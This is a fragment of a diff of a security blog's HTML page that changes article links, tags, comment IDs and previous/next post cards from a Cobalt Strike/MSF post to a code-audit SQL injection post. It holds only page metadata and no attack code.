-                    <a href="https://www.teamssix.com/210129-191714.html">https://www.teamssix.com/210129-191714.html</a>
+                    <a href="https://www.teamssix.com/211117-091653.html">https://www.teamssix.com/211117-091653.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -704,16 +586,12 @@ msf5 exploit(multi&#x2F;handler) &gt; run
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Cobalt-Strike/">
-                                    <span class="chip bg-color">Cobalt Strike</span>
+                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
-                                <a href="/tags/MSF/">
-                                    <span class="chip bg-color">MSF</span>
-                                </a>
-                            
-                                <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
-                                    <span class="chip bg-color">经验总结</span>
+                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">代码审计</span>
                                 </a>
                             
                         </div>
@@ -758,7 +636,7 @@ msf5 exploit(multi&#x2F;handler) &gt; run
         repo: 'Gitalk',
         owner: 'teamssix',
         admin: "teamssix",
-        id: '2021-01-29T19-17-14',
+        id: '2021-11-17T09-16-53',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -784,16 +662,17 @@ msf5 exploit(multi&#x2F;handler) &gt; run
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/210203-192358.html">
+                <a href="/211117-091653.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/域林.png" class="responsive-img" alt="【内网学习笔记】1、内网中常见名词解释">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111172027760.png" class="responsive-img" alt="【代码审计】SQL 注入">
                         
-                        <span class="card-title">【内网学习笔记】1、内网中常见名词解释</span>
+                        <span class="card-title">【代码审计】SQL 注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -803,34 +682,31 @@ msf5 exploit(multi&#x2F;handler) &gt; run
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    内网学习笔记
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                        <span class="chip bg-color">红队</span>
-                    </a>
                     
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91/">
-                        <span class="chip bg-color">内网</span>
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
                     </a>
                     
                 </div>
@@ -844,30 +720,30 @@ msf5 exploit(multi&#x2F;handler) &gt; run
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/210107-162325.html">
+                <a href="/211116-112510.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-9.png" class="responsive-img" alt="【经验总结】记录一次有点儿不一样的XSS">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111161127002.png" class="responsive-img" alt="【代码审计】Java Web 过滤器-filter">
                         
-                        <span class="card-title">【经验总结】记录一次有点儿不一样的XSS</span>
+                        <span class="card-title">【代码审计】Java Web 过滤器-filter</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            最近在挖SRC的时候，碰到一个有点儿不一样的XSS，在此简单记录一下。
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-07
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
-                                    经验总结
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
@@ -877,16 +753,12 @@ msf5 exploit(multi&#x2F;handler) &gt; run
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SRC/">
-                        <span class="chip bg-color">SRC</span>
+                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/XSS/">
-                        <span class="chip bg-color">XSS</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
-                        <span class="chip bg-color">经验总结</span>
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
                     </a>
                     
                 </div>
